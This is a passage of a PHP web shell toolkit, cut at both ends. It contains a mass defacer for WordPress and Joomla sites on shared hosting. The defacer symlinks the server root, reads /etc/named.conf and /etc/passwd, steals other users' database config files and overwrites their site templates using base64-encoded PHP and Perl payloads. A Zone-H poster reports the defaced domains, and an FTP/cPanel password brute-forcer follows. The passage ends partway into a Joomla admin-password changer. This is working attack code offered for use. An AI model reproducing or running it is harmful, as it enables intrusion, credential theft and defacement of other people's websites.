                        6
                    );
                    if ($hidden2) {
                        $output .=
                            "[+] index.php file founded in Theme Editor<br />";
                    } else {
                        $output .=
                            "[-] index.php Not found in Theme Editor<br />";
                    }
                }
                if ($hidden2) {
                    $url2 =
                        $site_url .
                        "/index.php?option=com_templates&layout=edit";
                    curl_setopt($ch, CURLOPT_URL, $url2);
                    curl_setopt($ch, CURLOPT_POST, 1);
                    curl_setopt(
                        $ch,
                        CURLOPT_POSTFIELDS,
                        "filecontent=" .
                            $content .
                            "&id=" .
                            $template_name .
                            "&cid[]=" .
                            $template_name .
                            "&" .
                            $hidden2 .
                            "=1&task=save_source&client=0"
                    );
                    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                    curl_setopt($ch, CURLOPT_HEADER, 0);
                    curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
                    curl_setopt($ch, CURLOPT_COOKIEJAR, $co);
                    curl_setopt($ch, CURLOPT_COOKIEFILE, $co);
                    $buffer = curl_exec($ch);
                    curl_close($ch);
                    $pos = strpos($buffer, '<dd class="message message fade">');
                    $cond = 0;
                    if ($pos === false) {
                        $output .= "[-] Updating Index.php Error<br />";
                    } else {
                        $output .=
                            "[+] Index.php Template successfully saved<br />";
                        $cond = 1;
                    }
                }
            }
        } else {
            $output .= "[-] DB Error<br />";
        }
        global $base_path;
        unlink($base_path . $co);
        return ["cond" => $cond, "output" => $output];
    }
    function exec_mode_1($def_url)
    {
        @mkdir("sym", 0777);
        $wr =
            "Options all \n DirectoryIndex Sux.html \n AddType text/plain .php \n AddHandler server-parsed .php \n  AddType text/plain .html \n AddHandler txt .html \n Require None \n Satisfy Any";
        $fp = @fopen("sym/.htaccess", "w");
        fwrite($fp, $wr);
        @symlink("/", "sym/root");
        $dominios = @file_get_contents("/etc/named.conf");
        @preg_match_all('/.*?zone "(.*?)" {/', $dominios, $out);
        $out[1] = array_unique($out[1]);
        $numero_dominios = count($out[1]);
        echo "Total domains: $numero_dominios <br><br />";
        $def = file_get_contents($def_url);
        $def = urlencode($def);
        $dd =
            "PD9waHANCiRkZWYgPSBmaWxlX2dldF9jb250ZW50cygnaHR0cDovL3pvbmVobWlycm9ycy5vcmcvZGVmYWNlZC8yMDEzLzAzLzE5L2Fzc29jaWFwcmVzcy5uZXQnKTsNCiRwID0gZXhwbG9kZSgncHVibGljX2h0bWwnLGRpcm5hbWUoX19GSUxFX18pKTsNCiRwID0gJHBbMF0uJ3B1YmxpY19odG1sJzsNCmlmICgkaGFuZGxlID0gb3BlbmRpcigkcCkpIHsNCiAgICAkZnAxID0gQGZvcGVuKCRwLicvaW5kZXguaHRtbCcsJ3crJyk7DQogICAgQGZ3cml0ZSgkZnAxLCAkZGVmKTsNCiAgICAkZnAxID0gQGZvcGVuKCRwLicvaW5kZXgucGhwJywndysnKTsNCiAgICBAZndyaXRlKCRmcDEsICRkZWYpOw0KICAgICRmcDEgPSBAZm9wZW4oJHAuJy9pbmRleC5odG0nLCd3KycpOw0KICAgIEBmd3JpdGUoJGZwMSwgJGRlZik7DQogICAgZWNobyAnRG9uZSc7DQp9DQpjbG9zZWRpcigkaGFuZGxlKTsNCnVubGluayhfX0ZJTEVfXyk7DQo/Pg==";
        $base_url =
            "http://" .
            $_SERVER["SERVER_NAME"] .
            dirname($_SERVER["SCRIPT_NAME"]) .
            "/sym/root/home/";
        $output = fopen("defaced.html", "a+");
        $_SESSION["count1"] =
            isset($_GET["st"]) && $_GET["st"] != ""
                ? (isset($_SESSION["count1"])
                    ? $_SESSION["count1"]
                    : 0)
                : 0;
        $_SESSION["count2"] =
            isset($_GET["st"]) && $_GET["st"] != ""
                ? (isset($_SESSION["count2"])
                    ? $_SESSION["count2"]
                    : 0)
                : 0;
        echo '<table style="width:75%;"><tr style="background:rgba(160, 82, 45,0.6);"><th>ID</th><th>SID</th><th>Domain</th><th>Type</th><th>Action</th><th>Status</th></tr>';
        $j = 1;
        $st = isset($_GET["st"]) && $_GET["st"] != "" ? $_GET["st"] : 0;
        for ($i = $st; $i <= $numero_dominios; $i++) {
            $domain = $out[1][$i];
            $dono_arquivo = @fileowner("/etc/valiases/" . $domain);
            $infos = @posix_getpwuid($dono_arquivo);
            if ($infos["name"] != "root") {
                $config01 = @file_get_contents(
                    $base_url .
                        $infos["name"] .
                        "/public_html/configuration.php"
                );
                $config02 = @file_get_contents(
                    $base_url . $infos["name"] . "/public_html/wp-config.php"
                );
                $config03 = @file_get_contents(
                    $base_url .
                        $infos["name"] .
                        "/public_html/blog/wp-config.php"
                );
                $cls = $j % 2 == 0 ? 'class="even"' : 'class="odd"';
                if ($config01 && preg_match("/dbprefix/i", $config01)) {
                    echo "<tr " .
                        $cls .
                        '><td align="center">' .
                        $j++ .
                        '</td><td align="center">' .
                        $i .
                        '</td><td><a href="http://' .
                        $domain .
                        '" target="blank">' .
                        $domain .
                        "</a></td>";
                    echo '<td align="center"><font color="pink">JOOMLA</font></td>';
                    $res = index_changer_joomla($config01, $def, $domain);
                    echo "<td>" . $res["output"] . "</td>";
                    if ($res["cond"]) {
                        echo '<td align="center"><span class="green">DEFACED</span></td>';
                        fwrite($output, "http://" . $domain . "<br>");
                        $_SESSION["count1"] = $_SESSION["count1"] + 1;
                    } else {
                        echo '<td align="center"><span class="red">FAILED</span></td>';
                    }
                    echo "</tr>";
                }
                if ($config02 && preg_match("/DB_NAME/i", $config02)) {
                    echo "<tr " .
                        $cls .
                        '><td align="center">' .
                        $j++ .
                        '</td><td align="center">' .
                        $i .
                        '</td><td><a href="http://' .
                        $domain .
                        '" target="blank">' .
                        $domain .
                        "</a></td>";
                    echo '<td align="center"><font color="yellow">WORDPRESS</font></td>';
                    $res = index_changer_wp($config02, $dd);
                    echo "<td>" . $res["output"] . "</td>";
                    if ($res["cond"]) {
                        echo '<td align="center"><span class="green">DEFACED</span></td>';
                        fwrite($output, "http://" . $domain . "<br>");
                        $_SESSION["count2"] = $_SESSION["count2"] + 1;
                    } else {
                        echo '<td align="center"><span class="red">FAILED</span></td>';
                    }
                    echo "</tr>";
                }
                $cls = $j % 2 == 0 ? 'class="even"' : 'class="odd"';
                if ($config03 && preg_match("/DB_NAME/i", $config03)) {
                    echo "<tr " .
                        $cls .
                        '><td align="center">' .
                        $j++ .
                        '</td><td align="center">' .
                        $i .
                        '</td><td><a href="http://' .
                        $domain .
                        '" target="blank">' .
                        $domain .
                        "</a></td>";
                    echo '<td align="center"><font color="yellow">WORDPRESS</font></td>';
                    $res = index_changer_wp($config03, $dd);
                    echo "<td>" . $res["output"] . "</td>";
                    if ($res["cond"]) {
                        echo '<td align="center"><span class="green">DEFACED</span></td>';
                        fwrite($output, "http://" . $domain . "<br>");
                        $_SESSION["count2"] = $_SESSION["count2"] + 1;
                    } else {
                        echo '<td align="center"><span class="red">FAILED</span></td>';
                    }
                    echo "</tr>";
                }
            }
        }
        echo "</table>";
        echo "<hr/>";
        echo "Total Defaced = " .
            ($_SESSION["count1"] + $_SESSION["count2"]) .
            " (JOOMLA = " .
            $_SESSION["count1"] .
            ", WORDPRESS = " .
            $_SESSION["count2"] .
            ")<br />";
        echo '<a href="defaced.html" target="_blank">View Total Defaced urls</a><br />';
        if ($_SESSION["count1"] + $_SESSION["count2"] > 0) {
            echo '<a href="' .
                $_SERVER["PHP_SELF"] .
                "?pass=" .
                $_GET["pass"] .
                '&zh=1" target="_blank" id="zhso">Send to Zone-H</a>';
        }
    }
    function exec_mode_2($def_url)
    {
        $domains = @file_get_contents("/etc/named.conf");
        @preg_match_all('/.*?zone "(.*?)" {/', $domains, $out);
        $out = array_unique($out[1]);
        $num = count($out);
        print "Total domains: $num<br><br />";
        $def = file_get_contents($def_url);
        $def = urlencode($def);
        $output = fopen("defaced.html", "a+");
        $defaced = "";
        $count1 = 0;
        $count2 = 0;
        echo '<table style="width:75%;"><tr style="background:rgba(160, 82, 45,0.6);"><th>ID</th><th>SID</th><th>Domain</th><th>Type</th><th>Action</th><th>Status</th></tr>';
        $j = 1;
        $map = [];
        foreach ($out as $d) {
            $info = @posix_getpwuid(fileowner("/etc/valiases/" . $d));
            $map[$info["name"]] = $d;
        }
        $dt = 'IyEvdXNyL2Jpbi9wZXJsIC1JL3Vzci9sb2NhbC9iYW5kbWluDQpzdWIgbGlsew0KICAgICgkdXNlcikgPSBAXzsNCiAgICAkbXNyID0gcXh7cHdkfTs
   NCiAgICAka29sYT0kbXNyLiIvIi4kdXNlcjsNCiAgICAka29sYT1+cy9cbi8vZzsNCiAgICBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2
   h0bWwvY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLicjI2pvb21sYS50eHQnKTsgDQogICAgc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19od
   G1sL3dwLWNvbmZpZy5waHAnLCRrb2xhLicjI3dvcmRwcmVzcy50eHQnKTsNCiAgICBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwv
   YmxvZy93cC1jb25maWcucGhwJywka29sYS4nIyNzd29yZHByZXNzLnR4dCcpOw0KfQ0KDQpsb2NhbCAkLzsNCm9wZW4oRklMRSwgJy9ldGMvcGFzc3d
   kJyk7ICANCkBsaW5lcyA9IDxGSUxFPjsgDQpjbG9zZShGSUxFKTsNCiR5ID0gQGxpbmVzOw0KDQpmb3IoJGthPTA7JGthPCR5OyRrYSsrKXsNCiAgIC
   B3aGlsZShAbGluZXNbJGthXSAgPX4gbS8oLio/KTp4Oi9nKXsNCiAgICAgICAgJmxpbCgkMSk7DQogICAgfQ0KfQ==';
        mkdir("plsym", 0777);
        file_put_contents("plsym/plsym.cc", base64_decode($dt));
        chmod("plsym/plsym.cc", 0755);
        $wr =
            "Options FollowSymLinks MultiViews Indexes ExecCGI\n\nAddType application/x-httpd-cgi .cc\n\nAddHandler cgi-script .cc\nAddHandler cgi-script .cc";
        $fp = @fopen("plsym/.htaccess", "w");
        fwrite($fp, $wr);
        fclose($fp);
        $res = file_get_contents(
            "http://" .
                $_SERVER["SERVER_NAME"] .
                dirname($_SERVER["SCRIPT_NAME"]) .
                "/plsym/plsym.cc"
        );
        $url =
            "http://" .
            $_SERVER["SERVER_NAME"] .
            dirname($_SERVER["SCRIPT_NAME"]) .
            "/plsym/";
        unlink("plsym/plsym.cc");
        $data = file_get_contents($url);
        preg_match_all('/<a href="(.+)">/', $data, $match);
        unset($match[1][0]);
        $i = 1;
        foreach ($match[1] as $m) {
            $mz = explode("##", urldecode($m));
            $config01 = "";
            $config02 = "";
            if ($mz[1] == "joomla.txt") {
                $config01 = file_get_contents($url . $m);
            }
            if ($mz[1] == "wordpress.txt") {
                $config02 = file_get_contents($url . $m);
            }
            $domain = $map[$mz[0]];
            $cls = $j % 2 == 0 ? 'class="even"' : 'class="odd"';
            if ($config01 && preg_match("/dbprefix/i", $config01)) {
                echo "<tr " .
                    $cls .
                    '><td align="center">' .
                    $j++ .
                    '</td><td align="center">' .
                    $i++ .
                    '</td><td><a href="http://' .
                    $domain .
                    '" target="blank">' .
                    $domain .
                    "</a></td>";
                echo '<td align="center"><font color="pink">JOOMLA</font></td>';
                $res = index_changer_joomla($config01, $def, $domain);
                echo "<td>" . $res["output"] . "</td>";
                if ($res["cond"]) {
                    echo '<td align="center"><span class="green">DEFACED</span></td>';
                    fwrite($output, "http://" . $domain . "<br>");
                    $count1++;
                } else {
                    echo '<td align="center"><span class="red">FAILED</span></td>';
                }
                echo "</tr>";
            }
            if ($config02 && preg_match("/DB_NAME/i", $config02)) {
                echo "<tr " .
                    $cls .
                    '><td align="center">' .
                    $j++ .
                    '</td><td><a href="http://' .
                    $domain .
                    '" target="blank">' .
                    $domain .
                    "</a></td>";
                echo '<td align="center"><font color="yellow">WORDPRESS</font></td>';
                $res = index_changer_wp($config02, $def);
                echo "<td>" . $res["output"] . "</td>";
                if ($res["cond"]) {
                    echo '<td align="center"><span class="green">DEFACED</span></td>';
                    fwrite($output, "http://" . $domain . "<br>");
                    $count2++;
                } else {
                    echo '<td align="center"><span class="red">FAILED</span></td>';
                }
                echo "</tr>";
            }
        }
        echo "</table>";
        echo "<hr/>";
        echo "Total Defaced = " .
            ($count1 + $count2) .
            " (JOOMLA = " .
            $count1 .
            ", WORDPRESS = " .
            $count2 .
            ")<br />";
        echo '<a href="defaced.html" target="_blank">View Total Defaced urls</a><br />';
        if ($count1 + $count2 > 0) {
            echo '<a href="' .
                $_SERVER["PHP_SELF"] .
                "?pass=" .
                $_GET["pass"] .
                '&zh=1" target="_blank" id="zhso">Send to Zone-H</a>';
        }
    }
    function exec_mode_3($def_url)
    {
        $domains = @file_get_contents("/etc/named.conf");
        @preg_match_all('/.*?zone "(.*?)" {/', $domains, $out);
        $out = array_unique($out[1]);
        $num = count($out);
        print "Total domains: $num<br><br />";
        $def = file_get_contents($def_url);
        $def = urlencode($def);
        $output = fopen("defaced.html", "a+");
        $defaced = "";
        $count1 = 0;
        $count2 = 0;
        echo '<table style="width:75%;"><tr style="background:rgba(160, 82, 45,0.6);"><th>ID</th><th>SID</th><th>Domain</th><th>Type</th><th>Action</th><th>Status</th></tr>';
        $j = 1;
        $map = [];
        foreach ($out as $d) {
            $info = @posix_getpwuid(fileowner("/etc/valiases/" . $d));
            $map[$info["name"]] = $d;
        }
        $dt = 'IyEvdXNyL2Jpbi9wZXJsIC1JL3Vzci9sb2NhbC9iYW5kbWluDQpzdWIgbGlsew0KICAgICgkdXNlcikgPSBAXzsNCiAgICAkbXNyID0gcXh7cHd
   kfTsNCiAgICAka29sYT0kbXNyLiIvIi4kdXNlcjsNCiAgICAka29sYT1+cy9cbi8vZzsNCiAgICBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcH
   VibGljX2h0bWwvY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLicjI2pvb21sYS50eHQnKTsgDQogICAgc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL
   3B1YmxpY19odG1sL3dwLWNvbmZpZy5waHAnLCRrb2xhLicjI3dvcmRwcmVzcy50eHQnKTsNCiAgICBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicv
   cHVibGljX2h0bWwvYmxvZy93cC1jb25maWcucGhwJywka29sYS4nIyNzd29yZHByZXNzLnR4dCcpOw0KfQ0KDQpsb2NhbCAkLzsNCm9wZW4oRkl
   MRSwgJ2RhdGEudHh0Jyk7ICANCkBsaW5lcyA9IDxGSUxFPjsgDQpjbG9zZShGSUxFKTsNCiR5ID0gQGxpbmVzOw0KDQpmb3IoJGthPTA7JGthPC
   R5OyRrYSsrKXsNCiAgICB3aGlsZShAbGluZXNbJGthXSAgPX4gbS8oLio/KTp4Oi9nKXsNCiAgICAgICAgJmxpbCgkMSk7DQogICAgfQ0KfQ==';
        mkdir("plsym", 0777);
        file_put_contents("plsym/data.txt", $_POST["man_data"]);
        file_put_contents("plsym/plsym.cc", base64_decode($dt));
        chmod("plsym/plsym.cc", 0755);
        $wr =
            "Options FollowSymLinks MultiViews Indexes ExecCGI\n\nAddType application/x-httpd-cgi .cc\n\nAddHandler cgi-script .cc\nAddHandler cgi-script .cc";
        $fp = @fopen("plsym/.htaccess", "w");
        fwrite($fp, $wr);
        fclose($fp);
        $res = file_get_contents(
            "http://" .
                $_SERVER["SERVER_NAME"] .
                dirname($_SERVER["SCRIPT_NAME"]) .
                "/plsym/plsym.cc"
        );
        $url =
            "http://" .
            $_SERVER["SERVER_NAME"] .
            dirname($_SERVER["SCRIPT_NAME"]) .
            "/plsym/";
        unlink("plsym/plsym.cc");
        $data = file_get_contents($url);
        preg_match_all('/<a href="(.+)">/', $data, $match);
        unset($match[1][0]);
        $i = 1;
        foreach ($match[1] as $m) {
            $mz = explode("##", urldecode($m));
            $config01 = "";
            $config02 = "";
            if ($mz[1] == "joomla.txt") {
                $config01 = file_get_contents($url . $m);
            }
            if ($mz[1] == "wordpress.txt") {
                $config02 = file_get_contents($url . $m);
            }
            $domain = $map[$mz[0]];
            $cls = $j % 2 == 0 ? 'class="even"' : 'class="odd"';
            if ($config01 && preg_match("/dbprefix/i", $config01)) {
                echo "<tr " .
                    $cls .
                    '><td align="center">' .
                    $j++ .
                    '</td><td align="center">' .
                    $i++ .
                    '</td><td><a href="http://' .
                    $domain .
                    '" target="blank">' .
                    $domain .
                    "</a></td>";
                echo '<td align="center"><font color="pink">JOOMLA</font></td>';
                $res = index_changer_joomla($config01, $def, $domain);
                echo "<td>" . $res["output"] . "</td>";
                if ($res["cond"]) {
                    echo '<td align="center"><span class="green">DEFACED</span></td>';
                    fwrite($output, "http://" . $domain . "<br>");
                    $count1++;
                } else {
                    echo '<td align="center"><span class="red">FAILED</span></td>';
                }
                echo "</tr>";
            }
            if ($config02 && preg_match("/DB_NAME/i", $config02)) {
                echo "<tr " .
                    $cls .
                    '><td align="center">' .
                    $j++ .
                    '</td><td><a href="http://' .
                    $domain .
                    '" target="blank">' .
                    $domain .
                    "</a></td>";
                echo '<td align="center"><font color="yellow">WORDPRESS</font></td>';
                $res = index_changer_wp($config02, $def);
                echo "<td>" . $res["output"] . "</td>";
                if ($res["cond"]) {
                    echo '<td align="center"><span class="green">DEFACED</span></td>';
                    fwrite($output, "http://" . $domain . "<br>");
                    $count2++;
                } else {
                    echo '<td align="center"><span class="red">FAILED</span></td>';
                }
                echo "</tr>";
            }
        }
        echo "</table>";
        echo "<hr/>";
        echo "Total Defaced = " .
            ($count1 + $count2) .
            " (JOOMLA = " .
            $count1 .
            ", WORDPRESS = " .
            $count2 .
            ")<br />";
        echo '<a href="defaced.html" target="_blank">View Total Defaced urls</a><br />';
        if ($count1 + $count2 > 0) {
            echo '<a href="' .
                $_SERVER["PHP_SELF"] .
                "?pass=" .
                $_GET["pass"] .
                '&zh=1" target="_blank" id="zhso">Send to Zone-H</a>';
        }
    }
    echo '<!DOCTYPE html><html><head><link href="http://fonts.googleapis.com/css?family=Orbitron:700" rel="stylesheet" type="text/css"><style type="text/css">.header {position:fixed;width:100%;top:0;background:#000;}.footer {position:fixed;width:100%;bottom:0;background:#000;}input[type="radio"]{margin-top: 0;}.td2 {border-left:1px solid red;border-radius: 2px 2px 2px 2px;}.even {background-color: rgba(25, 25, 25, 0.6);}.odd {background-color: rgba(102, 102, 102, 0.6);}textarea{background: rgba(0,0,0,0.6); color: white;}.green {color:#00FF00;font-weight:bold;}.red {color:#FF0000;font-weight:bold;}</style><script type="text/javascript">function change() {if(document.getElementById(\'rcd\').checked == true) {document.getElementById(\'tra\').style.display = \'\';} else {document.getElementById(\'tra\').style.display = \'none\';}}function hide() {document.getElementById(\'tra\').style.display = \'none\';}</script></head><body><h2 style="font-size:25px;color:#00ff00;text-align: center;font-family:orbitron;text-shadow: 6px 6px 6px black;">Wordpress and Joomla Mass Defacer</h2>';
    if (!isset($_POST["form_action"]) && !isset($_GET["mode"])) {
        echo '<center><div class="mybox" align="center"><form action="" method="post"><table><tr><td><input type="radio" value="1" name="mode" checked="checked" onclick="hide();"></td><td>using /etc/named.conf (' .
            (is_readable("/etc/named.conf")
                ? '<span class="green">READABLE</span>'
                : '<span class="red">NOT READABLE</span>') .
            ')</td></tr><tr><td><input type="radio" value="2" name="mode" onclick="hide();"></td><td>using /etc/passwd (' .
            (is_readable("/etc/passwd")
                ? '<span class="green">READABLE</span>'
                : '<span class="red">NOT READABLE</span>') .
            ')</td></tr><tr><td><input type="radio" value="2" name="mode" id="rcd" onclick="change();"></td><td>manual copy of /etc/passwd</td></tr><tr id="tra" style="display: none;"><td></td><td><textarea cols="60" rows="10" name="man_data"></textarea></td></tr></table><br><input type="hidden" name="form_action" value="1"><table><tr><td><b>index url: </b><input class="inputz" size="45" type="text" name="defpage" value=""></tr></td></table><input class="inputzbut" type="submit" value="Attack !" name="Submit"></form></div></center>';
    }
    $milaf_el_index = $_POST["defpage"];
    if ($_POST["form_action"] == 1) {
        if ($_POST["mode"] == 1) {
            exec_mode_1($milaf_el_index);
        }
        if ($_POST["mode"] == 2) {
            exec_mode_2($milaf_el_index);
        }
        if ($_POST["mode"] == 3) {
            exec_mode_3($milaf_el_index);
        }
    }
    if ($_GET["mode"] == 1) {
        exec_mode_1($milaf_el_index);
    }
    echo "</body></html>";
} elseif (isset($_GET["x"]) && $_GET["x"] == "zone-h") {
    $defacer = "ReZK2LL";
    $display_details = 0;
    $method = 14;
    $reason = 5;
    error_reporting(0);
    set_time_limit(0);
    if (!function_exists("curl_init")) {
        echo "CURL ERROR\n";
        exit();
    }
    $cli = isset($argv[0]) ? 1 : 0;
    if ($cli == 1) {
        $file = $argv[1];
        $sites = file($file);
    }
    if (function_exists(apache_setenv)) {
        @apache_setenv("no-gzip", 1);
    }
    @ini_set("zlib.output_compression", 0);
    @ini_set("implicit_flush", 1);
    @ob_implicit_flush(true);
    @ob_end_flush();
    if (isset($_POST["domains"])) {
        $sites = explode("\n", $_POST["domains"]);
    }
    if (file_exists($_FILES["file"]["tmp_name"])) {
        $file = $_FILES["file"]["tmp_name"];
        $sites = file($file);
    }
    echo <<<EOF
<div align="center"><table width="67%"><tr><td align=center></td></tr></table><br><pre>
EOF;
    if (!isset($_POST["defacer"])) {
        echo <<<EOF
<div class="mybox"><h2 class="k2ll33d2">Zone-H Poster</h2><form enctype="multipart/form-data" method="POST"><div align='center'><span lang='en-us'><b>Defacer&nbsp;:</b></span><input class='inputz' name="defacer" type="text" value="$defacer" /><br/><table width='55%'><tr><td align='center'><span lang='en-us'><b>Domains:</b></span><p align='center'>&nbsp;<textarea rows='30' name='domains' placeholder=' put domains here' cols='50' class='inputz'></textarea><br/><span lang='en-us'><b>OR</b></span><br/>Submit form .txt file:<br/><input name="file" type="file" /><br><br/><br/><input class='inputzbut' type='submit' value='Send' name='submit'></p></td></tr></table></form></div>
EOF;
    }
    $defacer = $_POST["defacer"];
    if (!$sites) {
        echo "</pre>";
        exit();
    }
    $sites = array_unique(str_replace("http://", "", $sites));
    $total = count($sites);
    echo "[+] Total unique domain: $total\n\n";
    $pause = 10;
    $start = time();
    $main = curl_multi_init();
    for ($m = 0; $m < 3; $m++) {
        $http[] = curl_init();
    }
    for ($n = 0; $n < $total; $n += 30) {
        if ($display_details == 1) {
            for ($x = 0; $x < 30; $x++) {
                echo "[+] Adding " . rtrim($sites[$n + $x]) . "";
                echo "\n";
            }
        }
        $d = $n + 30;
        if ($d > $total) {
            $d = $total;
        }
        echo "=====================>[$d/$total]\n";
        for ($w = 0; $w < 3; $w++) {
            $p = $w * 10;
            if (!isset($sites[$n + $p])) {
                $pause = $w;
                break;
            }
            $posts[$w] =
                "defacer=$defacer&domain1=http%3A%2F%2F" .
                rtrim($sites[$n + $p]) .
                "&domain2=http%3A%2F%2F" .
                rtrim($sites[$n + $p + 1]) .
                "&domain3=http%3A%2F%2F" .
                rtrim($sites[$n + $p + 2]) .
                "&domain4=http%3A%2F%2F" .
                rtrim($sites[$n + $p + 3]) .
                "&domain5=http%3A%2F%2F" .
                rtrim($sites[$n + $p + 4]) .
                "&domain6=http%3A%2F%2F" .
                rtrim($sites[$n + $p + 5]) .
                "&domain7=http%3A%2F%2F" .
                rtrim($sites[$n + $p + 6]) .
                "&domain8=http%3A%2F%2F" .
                rtrim($sites[$n + $p + 7]) .
                "&domain9=http%3A%2F%2F" .
                rtrim($sites[$n + $p + 8]) .
                "&domain10=http%3A%2F%2F" .
                rtrim($sites[$n + $p + 9]) .
                "&hackmode=" .
                $method .
                "&reason=" .
                $reason .
                "&submit=Send";
            $curlopt = [
                CURLOPT_USERAGENT => "Mozilla/5.0 (Windows NT 6.1;WOW64) AppleWebKit/535.16 (KHTML, like Gecko) Chrome/18.0.1003.1 Safari/535.16",
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_FOLLOWLOCATION => true,
                CURLOPT_ENCODING => true,
                CURLOPT_HEADER => false,
                CURLOPT_HTTPHEADER => ["Keep-Alive: 7"],
                CURLOPT_CONNECTTIMEOUT => 3,
                CURLOPT_URL => "http://www.zone-h.com/notify/mass",
                CURLOPT_POSTFIELDS => $posts[$w],
            ];
            curl_setopt_array($http[$w], $curlopt);
            curl_multi_add_handle($main, $http[$w]);
        }
        $running = null;
        do {
            curl_multi_exec($main, $running);
        } while ($running > 0);
        for ($m = 0; $m < 3; $m++) {
            if ($pause == $m) {
                break;
            }
            curl_multi_remove_handle($main, $http[$m]);
            $code = curl_getinfo($http[$m], CURLINFO_HTTP_CODE);
            if ($code != 200) {
                while (true) {
                    echo " [-]Error!....Retrying";
                    echo "\n";
                    sleep(5);
                    curl_exec($http[$m]);
                    $code = curl_getinfo($http[$m], CURLINFO_HTTP_CODE);
                    if ($code == 200) {
                        break;
                    }
                }
            }
        }
    }
    $end = time() - $start;
    echo "Done";
    echo "\n\n[*]Time: $end seconds\n";
    curl_multi_close($main);
    if ($cli == 0) {
        echo "</pre></body></html>";
    }
    exit();
} elseif (isset($_GET["x"]) && $_GET["x"] == "brute") {

    $connect_timeout = 5;
    set_time_limit(0);
    $submit = $_REQUEST["submit"];
    $users = $_REQUEST["users"];
    $pass = $_REQUEST["passwords"];
    $target = $_REQUEST["target"];
    $cracktype = $_REQUEST["cracktype"];
    if ($target == "") {
        $target = "localhost";
    }
    ?><div align="center"><form method="POST" style="border: 1px solid #000000"><br><?php
function ftp_check($host, $user, $pass, $timeout)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "ftp://$host");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_HTTPAUTH, CURLAUTH_BASIC);
    curl_setopt($ch, CURLOPT_FTPLISTONLY, 1);
    curl_setopt($ch, CURLOPT_USERPWD, "$user:$pass");
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
    curl_setopt($ch, CURLOPT_FAILONERROR, 1);
    $data = curl_exec($ch);
    if (curl_errno($ch) == 28) {
        print "<b>Connection Timed out</b>";
        exit();
    } elseif (curl_errno($ch) == 0) {
        print "<table width='67%'><tr><td align=center><b>Username ($user) | Password ($pass)</b></td></tr></table>";
    }
    curl_close($ch);
}
function cpanel_check($host, $user, $pass, $timeout)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "http://$host:2082");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_HTTPAUTH, CURLAUTH_BASIC);
    curl_setopt($ch, CURLOPT_USERPWD, "$user:$pass");
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
    curl_setopt($ch, CURLOPT_FAILONERROR, 1);
    $data = curl_exec($ch);
    if (curl_errno($ch) == 28) {
        print "<b>Connection Timed out</b>";
        exit();
    } elseif (curl_errno($ch) == 0) {
        print "<table width='67%'><tr><td align=center><b>[+]Username ($user) | Password ($pass)</b></td></tr></table>";
    }
    curl_close($ch);
}
if (isset($submit) && !empty($submit)) {
    if (empty($users) && empty($pass)) {
        print "<p><b>Error : Check The Users and Password List</b></p>";
        exit();
    }
    if (empty($users)) {
        print "<p><b>Error :Check The Users List</b></p>";
        exit();
    }
    if (empty($pass)) {
        print "<p><b>Error :Check The Password List</b></p>";
        exit();
    }
    $userlist = explode("\n", $users);
    $passlist = explode("\n", $pass);
    print "<b>[~] Wait ...</b><br><br>";
    foreach ($userlist as $user) {
        $pureuser = trim($user);
        foreach ($passlist as $password) {
            $purepass = trim($password);
            if ($cracktype == "ftp") {
                ftp_check($target, $pureuser, $purepass, $connect_timeout);
            }
            if ($cracktype == "cpanel") {
                cpanel_check($target, $pureuser, $purepass, $connect_timeout);
            }
        }
    }
}
echo "<cecnter><div class='mybox'><h2 class='k2ll33d2'>The Cracker</h2><form method=POST action=''><table width='67%'><tr><td><br><p align='center'><b><span lang='en-us'>IP</span> :<input class='inputz' type='text' name='target' size='16' value=$target></b></p><div align='center'><p align='center'>users<textarea class='inputz' cols=20 rows=20 name='users'>";
system("ls /var/mail");
echo "</textarea>passwords<textarea class='inputz' cols=20 rows=20 name='passwords'>123123\n123456\n1234567\n12345678\n123456789\n159159\n112233\nadmin\n332211\n14789632\npasswd\n159357\n357951\n114477\npass\nPassword</textarea><br><br><input name='cracktype' value='cpanel' checked type='radio'></span><b>Cpanel(2082)</b><input name='cracktype' value='ftp' style='font-weight: 700;' type='radio'></font></font><font style='font-weight: 700;' size='2' face='Tahoma'><span style='font-weight: 700;'>Ftp (21)</span></p><br><center><input class='inputzbut' type='submit' value='Start Cracking' name='submit'></center></td></tr></table></td></tr></form></div></center>";
die();

} elseif (isset($_GET["x"]) && $_GET["x"] == "joomla") {
    if (empty($_POST["pwd"])) {
        echo "<br><br><br><center><div class='mybox'><h2 class='k2ll33d2'>Joomla login changer</h2><FORM method='POST'><br><br><br>DB_Prefix :&nbsp;&nbsp;<INPUT class ='inputz' size='8' value='jos_' name='prefix' type='text'>&nbsp;host :&nbsp;&nbsp;<INPUT class ='inputz' size='10' value='localhost' name='localhost' type='text'>&nbsp;database :&nbsp;&nbsp;<INPUT class ='inputz' size='10' value='database' name='database' type='text'>&nbsp;username :&nbsp;&nbsp;<INPUT class ='inputz' size='10' value='db_user' name='username' type='text'>&nbsp;password :&nbsp;&nbsp;<INPUT class ='inputz' size='10' value='db_pass' name='password' type='text'><br>&nbsp;&nbsp;<br>New Username:&nbsp;&nbsp;<INPUT class ='inputz' name='admin' size='15' value='k2'><br><br>New Password:&nbsp;&nbsp;<INPUT class ='inputz' name='pwd' size='15' value='123123'><br><br>&nbsp;&nbsp;<INPUT value='change' class='inputzbut' name='send' type='submit'></FORM></div></center>";
    } else {
        $prefix = $_POST["prefix"];
        $localhost = $_POST["localhost"];
        $database = $_POST["database"];
